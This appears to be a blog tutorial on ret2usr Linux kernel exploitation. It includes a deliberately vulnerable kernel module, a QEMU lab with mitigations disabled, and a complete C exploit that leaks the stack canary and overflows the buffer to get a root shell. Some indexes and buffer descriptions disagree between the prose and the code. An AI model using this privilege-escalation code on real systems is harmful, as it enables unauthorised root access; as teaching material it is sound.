<!doctype html><html lang=en>
<head>
<title>Linux Kernel 0x01 :: Return to User-space :: Anvbis</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Our first kernel exploitation technique, returning to user-space. Part two of a series of posts on Linux kernel exploitation techniques.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://anvbis.github.io/posts/linux-kernel-1-ret2usr/>
<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
<link rel=stylesheet href=https://anvbis.github.io/assets/green.css>
<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/green.png>
<meta name=twitter:card content="summary">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux Kernel 0x01 :: Return to User-space">
<meta property="og:description" content="Our first kernel exploitation technique, returning to user-space. Part two of a series of posts on Linux kernel exploitation techniques.">
<meta property="og:url" content="https://anvbis.github.io/posts/linux-kernel-1-ret2usr/">
<meta property="og:site_name" content="Anvbis">
<meta property="og:image" content="https://anvbis.github.io/img/favicon/green.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="Linux Kernel Exploitation">
<meta property="article:published_time" content="2022-01-25 00:00:00 +0000 UTC">
</head>
<body class=green>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Anvbis
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://anvbis.github.io/posts/linux-kernel-1-ret2usr/>Linux Kernel 0x01 :: Return to User-space</a></h1>
<div class=post-meta>
<span class=post-date>
2022-01-25
</span>
</div>
<span class=post-tags>
#<a href=https://anvbis.github.io/tags/linux/>linux</a>&nbsp;
#<a href=https://anvbis.github.io/tags/kernel/>kernel</a>&nbsp;
</span>
<div class=post-content><div>
<h2 id=table-of-contents>Table of Contents<a href=#table-of-contents class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<ol>
<li><a href=#user-space-vs-kernel-space>User-space vs. Kernel-space</a></li>
<li><a href=#return-to-user-space-overview>Return to User-space Overview</a></li>
<li><a href=#saving-the-initial-state>Saving the Initial State</a></li>
<li><a href=#restoring-the-initial-state>Restoring the Initial State</a></li>
<li><a href=#escalating-privileges-in-the-kernel>Escalating Privileges in the Kernel</a></li>
<li><a href=#a-vulnerable-kernel-module>A Vulnerable Kernel Module</a></li>
<li><a href=#exploiting-the-kernel-module>Exploiting the Kernel Module</a></li>
<li><a href=#environment-setup>Environment Setup</a></li>
<li><a href=#building-the-exploit>Building the Exploit</a></li>
</ol>
<h2 id=user-space-vs-kernel-space>User-space vs. Kernel-space<a href=#user-space-vs-kernel-space class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.</p>
<p>Within kernel-space all physical memory is available (to some degree, depending on which kernel exploit mitigations are enabled). What this means, is that we are able to read and potentially execute code loaded in user-space.</p>
<p>It is important to note, however, that most kernel exploit mitigations attempt to separate user-space from kernel-space, preventing us from executing any code loaded in user-space.</p>
<h2 id=return-to-user-space-overview>Return to User-space Overview<a href=#return-to-user-space-overview class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>The <code>ret2usr</code> exploit technique is very straight-forward. When all kernel exploit mitigations are disabled, you are able to execute user-space code inside kernel-space. This means we can write code that escalates our privileges and returns from kernel-space in order to execute arbitrary code, with the end goal of spawning a root shell.</p>
<p>As a result, all we need to do within our exploit is redirect process execution to user-space code that escalates privileges, returns to user-space and pops a shell.</p>
<h2 id=saving-the-initial-state>Saving the Initial State<a href=#saving-the-initial-state class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the <code>iretq</code> instruction will use the information saved below in order to return to user-space.</p>
<p>We save the required registers with the assembly code below in order to build our <code>iret</code> frame to later exit kernel-space.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> save_ss, save_sp, save_rf, save_cs;

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>save_user_space</span>()
{
    <span style=color:#75715e>/* save user-space */</span>
    __asm__(
        <span style=color:#e6db74>&#34;.intel_syntax noprefix;&#34;</span>
        <span style=color:#e6db74>&#34;mov save_ss, ss;&#34;</span>
        <span style=color:#e6db74>&#34;mov save_sp, rsp;&#34;</span>
        <span style=color:#e6db74>&#34;pushf;&#34;</span>
        <span style=color:#e6db74>&#34;pop save_rf;&#34;</span>
        <span style=color:#e6db74>&#34;mov save_cs, cs;&#34;</span>
        <span style=color:#e6db74>&#34;.att_syntax;&#34;</span>
    );
}
</code></pre></div><h2 id=restoring-the-initial-state>Restoring the Initial State<a href=#restoring-the-initial-state class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>In order to restore the initial state and return to user-space we require two instructions, <code>swapgs</code> and <code>iretq</code>. In x86_64 systems the <code>swapgs</code> instruction must be made before the <code>iretq</code> instruction as it swaps the <code>gs</code> register between kernel-mode and user-mode.</p>
<p>We next build our <code>iret</code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our <code>iretq</code> instruction to return from kernel-space.</p>
<p>Note: At the very top of our <code>iret</code> frame we put the address we want to return to.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>load_user_space</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> target)
{
    <span style=color:#75715e>/* return to user-space */</span>
    __asm__(
        <span style=color:#e6db74>&#34;.intel_syntax noprefix;&#34;</span>
        <span style=color:#e6db74>&#34;swapgs;&#34;</span>
        <span style=color:#e6db74>&#34;mov r15, save_ss;&#34;</span>
        <span style=color:#e6db74>&#34;push r15;&#34;</span>
        <span style=color:#e6db74>&#34;mov r15, save_sp;&#34;</span>
        <span style=color:#e6db74>&#34;push r15;&#34;</span>
        <span style=color:#e6db74>&#34;mov r15, save_rf;&#34;</span>
        <span style=color:#e6db74>&#34;push r15;&#34;</span>
        <span style=color:#e6db74>&#34;mov r15, save_cs;&#34;</span>
        <span style=color:#e6db74>&#34;push r15;&#34;</span>
        <span style=color:#e6db74>&#34;mov r15, %[rip];&#34;</span>
        <span style=color:#e6db74>&#34;push r15;&#34;</span>
        <span style=color:#e6db74>&#34;iretq;&#34;</span>
        <span style=color:#e6db74>&#34;.att_syntax;&#34;</span>
        <span style=color:#f92672>:</span> [rip] <span style=color:#e6db74>&#34;=&amp;r&#34;</span> (target)
    );
}
</code></pre></div><h2 id=escalating-privileges-in-the-kernel>Escalating Privileges in the Kernel<a href=#escalating-privileges-in-the-kernel class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Escalating privileges inside kernel-space is done via two function calls, <code>prepare_kernel_cred</code> and <code>commit_creds</code>.</p>
<p>The <code>prepare_kernel_cred</code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &lsquo;0&rsquo;, for the root user). The <code>commit_creds</code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.</p>
<p>We can find the address (in kernel-space) of both these functions by reading the <code>/proc/kallsyms</code> file.</p>
<pre><code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810881c0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81087e80 T commit_creds
</code></pre><p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rdi</span>, <span style=color:#66d9ef>rdi</span>
<span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>, <span style=color:#ae81ff>0xffffffff810881c0</span>  <span style=color:#960050;background-color:#1e0010>//</span> <span style=color:#66d9ef>prepare_kernel_cred</span>
<span style=color:#a6e22e>call</span>   <span style=color:#66d9ef>rbx</span>
<span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>, <span style=color:#ae81ff>0xffffffff81087e80</span>  <span style=color:#960050;background-color:#1e0010>//</span> <span style=color:#66d9ef>commit_creds</span>
<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rdi</span>, <span style=color:#66d9ef>rax</span>
<span style=color:#a6e22e>call</span>   <span style=color:#66d9ef>rbx</span>
</code></pre></div><p>Let&rsquo;s place this inside a function so we can easily use it within our final exploit.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>escalate_privileges</span>()
{
    <span style=color:#75715e>/* escalate privileges */</span>
    __asm__(
        <span style=color:#e6db74>&#34;.intel_syntax noprefix;&#34;</span>
        <span style=color:#e6db74>&#34;xor rdi, rdi;&#34;</span>
        <span style=color:#e6db74>&#34;movabs rbx, 0xffffffff810881c0;&#34;</span>  <span style=color:#75715e>// prepare_kernel_cred
</span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;call rbx;&#34;</span>
        <span style=color:#e6db74>&#34;movabs rbx, 0xffffffff81087e80;&#34;</span>  <span style=color:#75715e>// commit_creds
</span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;mov rdi, rax;&#34;</span>
        <span style=color:#e6db74>&#34;call rbx;&#34;</span>
        <span style=color:#e6db74>&#34;.att_syntax;&#34;</span>
    );

    <span style=color:#75715e>/* return to user-space */</span>
    load_user_space(<span style=color:#75715e>/* target return address */</span>);
}
</code></pre></div><h2 id=a-vulnerable-kernel-module>A Vulnerable Kernel Module<a href=#a-vulnerable-kernel-module class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>I&rsquo;ve written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its <code>challenge_read</code> and <code>challenge_write</code> functions.</p>
<div class=collapsable-code>
<input id=1 type=checkbox checked>
<label for=1>
<span class=collapsable-code__language>c</span>
<span class=collapsable-code__title>challenge.c</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-c><code>
#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/uaccess.h&gt;

MODULE_LICENSE(&#34;GPL&#34;);

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_to_user(buf, tmp, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_from_user(tmp, buf, len);
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create(&#34;challenge&#34;, 0666, NULL, &amp;fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
</code></pre>
</div>
<p>In the code block below we can see the kernel module&rsquo;s <code>read</code> handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer <code>out</code> of size 256 bytes. This means we can read 128 bytes below the small <code>tmp</code> buffer.</p>
<p>Perhaps we can use this to read stack values (e.g. the value of the stack canary).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> ssize_t <span style=color:#a6e22e>challenge_read</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>fp, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buf, size_t len, loff_t <span style=color:#f92672>*</span>off)
{
    <span style=color:#66d9ef>char</span> tmp[<span style=color:#ae81ff>128</span>];
    <span style=color:#66d9ef>return</span> raw_copy_to_user(buf, tmp, len);
}
</code></pre></div><p>In the code block below we can see the kernel module&rsquo;s <code>write</code> handler. It copies an arbitrary number of bytes into a 256 byte buffer <code>out</code>, that are then copied into a buffer stored on the stack <code>tmp</code> of size 128 bytes.</p>
<p>This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>static</span> ssize_t <span style=color:#a6e22e>challenge_write</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>fp, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buf, size_t len, loff_t <span style=color:#f92672>*</span>off)
{
    <span style=color:#66d9ef>char</span> tmp[<span style=color:#ae81ff>128</span>];
    <span style=color:#66d9ef>return</span> raw_copy_from_user(out, buf, len);
}
</code></pre></div><h2 id=exploiting-the-kernel-module>Exploiting the Kernel Module<a href=#exploiting-the-kernel-module class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>First, let&rsquo;s use the buffer overflow vulnerability in the kernel module&rsquo;s <code>read</code> function to dump a bunch of stack values. The below code reads 32 <code>unsigned long</code> values (256 bytes) and prints them out.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/proc/challenge&#34;</span>, O_RDWR);
    assert(fd <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>);

    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> leak[<span style=color:#ae81ff>32</span>];
    read(fd, leak, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span>);

    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>32</span>; <span style=color:#f92672>++</span>i)
        printf(<span style=color:#e6db74>&#34;%d: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, i, leak[i]);

    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17.</p>
<pre><code>/home/ctf # ./exploit
0: 0xffffffff81c00194
1: 0xffffffff81c001a0
2: 0xffffffff81aa85a0
3: 0xffffffff81345d8b
4: 0x4
5: 0xffff888006bf5700
6: 0x20000075a4070
7: 0xffff888006bf5710
8: 0x100020000
9: 0x0
10: 0xffff888000000000
11: 0x0
12: 0x0
13: 0x0
14: 0x0
15: 0xa73ee2eeab3d9f00
16: 0xa73ee2eeab3d9f00  &lt;-- stack canary
17: 0xffff888006bcd840  &lt;-- return address
...
</code></pre><p>Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the <code>tmp</code> buffer on the stack).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>leak_canary</span>(<span style=color:#66d9ef>int</span> fd)
{
    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> leak[<span style=color:#ae81ff>32</span>];
    read(fd, leak, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span>);
    <span style=color:#66d9ef>return</span> leak[<span style=color:#ae81ff>15</span>];
}
</code></pre></div><p>We should also write a function that overflows the buffer in the <code>write</code> handler and redirect process execution to our <code>escalate_privileges</code> function. We&rsquo;ll also want to overwrite the stack canary so the kernel module doesn&rsquo;t detect the overflow and halt execution.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>overflow_buffer</span>(<span style=color:#66d9ef>int</span> fd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> canary)
{
    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> payload[<span style=color:#ae81ff>18</span>];

    payload[<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> canary;
    payload[<span style=color:#ae81ff>17</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)escalate_privileges;

    write(fd, payload, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>18</span>);
}
</code></pre></div><h2 id=environment-setup>Environment Setup<a href=#environment-setup class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>In order for this technique to work, we&rsquo;ll need to disable all kernel exploit mitigation features in our kernel emulator. This means removing all instances of <code>+smep</code>, <code>+smap</code>, <code>kpti=1</code> and <code>kaslr</code>, and adding the <code>nokaslr</code> and <code>nopti</code> flags.</p>
<div class=collapsable-code>
<input id=2 type=checkbox>
<label for=2>
<span class=collapsable-code__language>sh</span>
<span class=collapsable-code__title>launch.sh</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-sh><code>
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-5.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -append &#34;console=ttyS0 nokaslr nopti quiet&#34;
</code></pre>
</div>
<p>Running the build and then the run scripts will drop us into a root shell on the kernel emulator.</p>
<pre><code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
</code></pre><h2 id=building-the-exploit>Building the Exploit<a href=#building-the-exploit class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>First, let&rsquo;s write a simple function that will spawn a shell via the <code>system</code> function. We&rsquo;ll need this after we return to user-space after escalating privileges.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>shell</span>()
{
    system(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
}
</code></pre></div><p>Now let&rsquo;s write the main logic of our exploit, it will do several things:</p>
<ol>
<li>Save the initial user-space state.</li>
<li>Leak the stack canary with the vulnerability in the <code>read</code> handler to perform a safe overflow.</li>
<li>Overflow the vulnerable buffer and redirect execution to our <code>escalate_privileges</code> function.</li>
<li>Escalate privileges in kernel-space.</li>
<li>Return to user-space and get a root shell.</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
    save_user_space();

    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/proc/challenge&#34;</span>, O_RDWR);
    assert(fd <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>);

    <span style=color:#75715e>/* leak stack canary */</span>
    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> canary <span style=color:#f92672>=</span> leak_canary(fd);
    printf(<span style=color:#e6db74>&#34;[*] canary @ 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, canary);

    overflow_buffer(fd, canary); 

    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>You can find the complete exploit code below.</p>
<div class=collapsable-code>
<input id=3 type=checkbox checked>
<label for=3>
<span class=collapsable-code__language>c</span>
<span class=collapsable-code__title>exploit.c</span>
<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
</label>
<pre class=language-c><code>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system(&#34;/bin/sh&#34;);
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        &#34;.intel_syntax noprefix;&#34;
        &#34;mov save_ss, ss;&#34;
        &#34;mov save_sp, rsp;&#34;
        &#34;pushf;&#34;
        &#34;pop save_rf;&#34;
        &#34;mov save_cs, cs;&#34;
        &#34;.att_syntax;&#34;
    ); 
}

void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        &#34;.intel_syntax noprefix;&#34;
        &#34;swapgs;&#34;
        &#34;mov r15, save_ss;&#34;
        &#34;push r15;&#34;
        &#34;mov r15, save_sp;&#34;
        &#34;push r15;&#34;
        &#34;mov r15, save_rf;&#34;
        &#34;push r15;&#34;
        &#34;mov r15, save_cs;&#34;
        &#34;push r15;&#34;
        &#34;mov r15, %[rip];&#34;
        &#34;push r15;&#34;
        &#34;iretq;&#34;
        &#34;.att_syntax;&#34;
        : [rip] &#34;=&amp;r&#34; (target)
    );
}

void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        &#34;.intel_syntax noprefix;&#34;
        &#34;xor rdi, rdi;&#34;
        &#34;movabs rbx, 0xffffffff810881c0;&#34;  // prepare_kernel_cred
        &#34;call rbx;&#34;
        &#34;movabs rbx, 0xffffffff81087e80;&#34;  // commit_creds
        &#34;mov rdi, rax;&#34;
        &#34;call rbx;&#34;
        &#34;.att_syntax;&#34;
    );

    /* return to user-space */
    load_user_space((unsigned long)shell);
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[32];
    read(fd, leak, sizeof(unsigned long) * 32);
    return leak[15];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[18];

    payload[15] = canary;
    payload[17] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 18);
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open(&#34;/proc/challenge&#34;, O_RDWR);
    assert(fd &gt; 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf(&#34;[*] canary @ 0x%lx\n&#34;, canary);

    overflow_buffer(fd, canary); 

    return 0;
}
</code></pre>
</div>
<p>Note that the exploit code will need to be compiled as a static executable in order to run on the kernel emulator.</p>
<pre><code>~/ $ gcc exploit.c -o exploit -static
</code></pre><p>After inserting the vulnerable kernel module and running our exploit we can see that our exploit leaked the stack canary and gave us a root shell.</p>
<pre><code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
uid=0(root) gid=0
</code></pre><h2 id=appendix>Appendix<a href=#appendix class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<ul>
<li><a href=https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/>Learning Linux Kernel Exploitation - Part 1</a></li>
<li><a href=http://old.iseclab.org/projects/vifuzz/docs/exploit.pdf>iSecLab - Kernel-mode exploits primer</a></li>
</ul>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>Anvbis &copy; 2022</span>
</div>
</div>
</footer>
<script src=https://anvbis.github.io/assets/main.js></script>
<script src=https://anvbis.github.io/assets/prism.js></script>
</div>
</body>
</html>